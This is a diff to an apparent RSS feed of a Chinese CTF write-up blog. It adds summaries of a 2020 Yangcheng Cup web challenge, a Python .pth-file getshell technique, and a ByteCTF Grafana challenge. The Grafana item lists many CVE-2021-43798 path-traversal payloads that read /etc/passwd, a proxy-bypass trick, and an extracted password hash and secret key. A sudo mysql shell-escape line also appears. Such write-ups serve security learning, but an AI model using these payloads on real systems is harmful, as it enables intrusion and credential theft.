@@ -24,5 +24,50 @@ sudo -l 列出目前用户可执行与无法执行的指令 (root) NOPASSWD: /us
 这种格式可以执行root权限命令，来找一下flag
 sudo mysql -e &#39;\! find / -name flag*&#39; 读flag]]></description>
 </item>
+<item>
+    <title>2020羊城杯</title>
+    <link>https://thnpkm.github.io/posts/ctf/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020/</link>
+    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/ctf/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020/</guid>
+    <description><![CDATA[WEB easycon 打开就是
+扫出来个index.php 然后访问
+提示eval post cmd，看来是post了个cmd可以执行命令
+找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片
+easyphp 源码
+&lt;?php $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== &#34;index.php&#34;) { unlink($file); } } } if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { echo &#34;Hacker&#34;; die(); } $filename = $_GET[&#39;filename&#39;]; if(preg_match(&#34;/[^a-z\.]/&#34;, $filename) == 1) { echo &#34;Hacker&#34;; die(); } $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !]]></description>
+</item>
+<item>
+    <title>Python pth文件写入getshell </title>
+    <link>https://thnpkm.github.io/posts/ctf/%E9%97%BD%E7%9B%BE%E6%9D%AF2023/</link>
+    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/ctf/%E9%97%BD%E7%9B%BE%E6%9D%AF2023/</guid>
+    <description><![CDATA[原理：Python pth文件写入getshell 参考https://www.cnblogs.com/Nestar/p/17336664.html
+python的site模块支持&quot;Site-specific configuration hook&quot;的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入
+sys.prefix和sys.exec_prefix在D:/Python，那么创建路径为D:\Python\Lib\site-packages\1.pth的pth文件，然后其内容为
+D:/Python/temp/ 重新启动python
+1.path的路径被添加到sys.path中
+site.py的实现中，有这么一段
+def addpackage(sitedir, name, known_paths): if known_paths is None: known_paths = _init_pathinfo() reset = True else: reset = False fullname = os.path.join(sitedir, name) _trace(f&#34;Processing .pth file: {fullname!r}&#34;) try: # locale encoding is not ideal especially on Windows. But we have used # it for a long time. setuptools uses the locale encoding too. f = io.TextIOWrapper(io.open_code(fullname), encoding=&#34;locale&#34;) except OSError: return with f: for n, line in enumerate(f): if line.]]></description>
+</item>
+<item>
+    <title>字节CTF </title>
+    <link>https://thnpkm.github.io/posts/ctf/%E5%AD%97%E8%8A%82ctf/</link>
+    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/ctf/%E5%AD%97%E8%8A%82ctf/</guid>
+    <description><![CDATA[字节ctf easy_grafana 去网上搜grafana比较近的漏洞 全是CVE-2021-43798：Grafana任意文件读取漏洞
+https://cloud.tencent.com/developer/article/1973276提供了很多payload
+/public/plugins/alertGroups/../../../../../../../../etc/passwd/public/plugins/alertlist/../../../../../../../../etc/passwd/public/plugins/annolist/../../../../../../../../etc/passwd/public/plugins/barchart/../../../../../../../../etc/passwd/public/plugins/bargauge/../../../../../../../../etc/passwd/public/plugins/canvas/../../../../../../../../etc/passwd/public/plugins/dashlist/../../../../../../../../etc/passwd/public/plugins/debug/../../../../../../../../etc/passwd/public/plugins/gauge/../../../../../../../../etc/passwd/public/plugins/geomap/../../../../../../../../etc/passwd/public/plugins/gettingstarted/../../../../../../../../etc/passwd/public/plugins/graph/../../../../../../../../etc/passwd/public/plugins/heatmap/../../../../../../../../etc/passwd/public/plugins/histogram/../../../../../../../../etc/passwd/public/plugins/live/../../../../../../../../etc/passwd/public/plugins/logs/../../../../../../../../etc/passwd/public/plugins/news/../../../../../../../../etc/passwd/public/plugins/nodeGraph/../../../../../../../../etc/passwd/public/plugins/piechart/../../../../../../../../etc/passwd/public/plugins/pluginlist/../../../../../../../../etc/passwd/public/plugins/stat/../../../../../../../../etc/passwd/public/plugins/state-timeline/../../../../../../../../etc/passwd/public/plugins/status-history/../../../../../../../../etc/passwd/public/plugins/table/../../../../../../../../etc/passwd/public/plugins/table-old/../../../../../../../../etc/passwd/public/plugins/text/../../../../../../../../etc/passwd/public/plugins/timeseries/../../../../../../../../etc/passwd/public/plugins/welcome/../../../../../../../../etc/passwd/public/plugins/xychart/../../../../../../../../etc/passwd 但是无一例外 都出现了400错误
+但是原因不清楚，了解到是nginx反向代理的问题
+参考这篇文章
+https://www.cnblogs.com/sevck/p/15660592.html在payload里面加入这个即可
+/#/../ 漏洞利用：
+https://github.com/jas502n/Grafana-CVE-2021-43798获取数据库密码
+/var/lib/grafana/grafana.db
+{&#34;password&#34;:&#34;b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/&#34;} 配置/etc/grafana/grafana.ini
+secret_key = SW2YcwTIb9zpO1hoPsMm 拿github的工具解密需要go环境]]></description>
+</item>
 </channel>
 </rss>
